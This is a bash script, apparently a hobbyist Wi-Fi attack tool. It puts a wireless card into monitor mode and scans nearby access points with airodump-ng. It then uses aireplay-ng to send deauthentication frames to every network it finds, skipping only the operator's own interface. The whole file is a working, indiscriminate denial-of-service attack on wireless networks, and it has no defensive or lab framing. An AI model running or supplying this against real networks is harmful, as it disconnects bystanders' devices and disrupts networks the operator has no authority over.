#!/bin/bash


( 
echo [!] Starting at $(date)
COMMS_IFACE="wlan0"
HACK_IFACE="wlan1"

trap ctrl_c INT

function ctrl_c() {
  echo "** Trapped CTRL-C"
  printf "Going to try to clean up nicely and exit\n"
  clean_pids
  pkill airodump-ng
  pkill aireplay
  exit
}

function clean_pids() {
  test -e /tmp/deauth_aurodump_pids && (
    echo "[+] killing deauth children: $(cat /tmp/deauth_aurodump_pids)"
    pids="$(cat /tmp/deauth_aurodump_pids)"
    if [ "$pids" != "" ]; then
      echo "$pids" | xargs kill
    fi
    rm /tmp/deauth_aurodump_pids
  )
}


test -e /tmp/deauth_airodump_log-01.csv && (

  printf "[+] Removing old log files\n"
  
  rm /tmp/deauth_airodump_log*.csv
  
)

test -e /tmp/deauth_aurodump_pids && (

  printf "[!] found an old pid file. Should I kill the pids before I remove? (y\\n) "
  read x
  if [ "$x" -eq "y" ] ; then
    clean_pids
  else 
    rm /tmp/deauth_aurodump_pids
  fi
)

WHITELIST_MAC="$(ifconfig $COMMS_IFACE | grep HWaddr | awk ' { print $5 }')"

printf "[+] Whitelisting mac $WHITELIST_MAC on $COMMS_IFACE\n"

iwconfig $HACK_IFACE  | grep "Mode:Monitor" 1>/dev/null || (

  printf "[+] Setting $HACK_IFACE into monitor mode\n"

  # down it
  ifconfig $HACK_IFACE down

  # set in monitor mode
  iwconfig $HACK_IFACE mode monitor

  # up it
  ifconfig $HACK_IFACE up

)

iwconfig $HACK_IFACE | grep "Mode:Monitor" 1>/dev/null || (

    printf "Unable to set monitor mode. Is something wrong?\n"

) && (

  printf "[+] Confirmed $HACK_IFACE is in monitor mode\n" 

)

printf "[+] Running airodump-ng for 30 seconds...\n"
( cmdpid=$BASHPID; (sleep 30; kill -3 $cmdpid 2>/dev/null 1>/dev/null) & exec airodump-ng $HACK_IFACE --output-format csv -w /tmp/deauth_airodump_log 2>/dev/null 1>/dev/null ) 2>/dev/null 1>/dev/null


cat /tmp/deauth_airodump_log-01.csv |  grep "Station MAC" -B 5000 | egrep -v "First time seen" | grep "," | awk ' { print $1 " " $6 " " $18} ' | sed 's/,//g' | egrep -iv "$WHITELIST_MAC" | while read target_mac channel ssid; do (

printf "[+] Starting deauth on BSSID $target_mac (channel $channel, ssid:$ssid)\n"
#aireplay-ng -0 0 -a $target_mac $HACK_IFACE 1>/dev/null
iwconfig $HACK_IFACE channel $channel
aireplay-ng -0 1 -a $target_mac $HACK_IFACE 

#(printf "$BASHPID ">>/tmp/deauth_aurodump_pids; exec aireplay-ng -0 0 -a $target_mac $HACK_IFACE >/dev/null && sleep 180) &
#( cmdpid=$BASHPID; exec airodump-ng $HACK_IFACE --output-format csv -w /tmp/deauth_airodump_log )

); done

sleep 5; 

echo [!] Stopped at $(date)

) | tee -a deauth.log
reset
exit
#( cmdpid=$BASHPID; (sleep 60; kill $cmdpid) & exec )
#above is a poor man's "timeout"
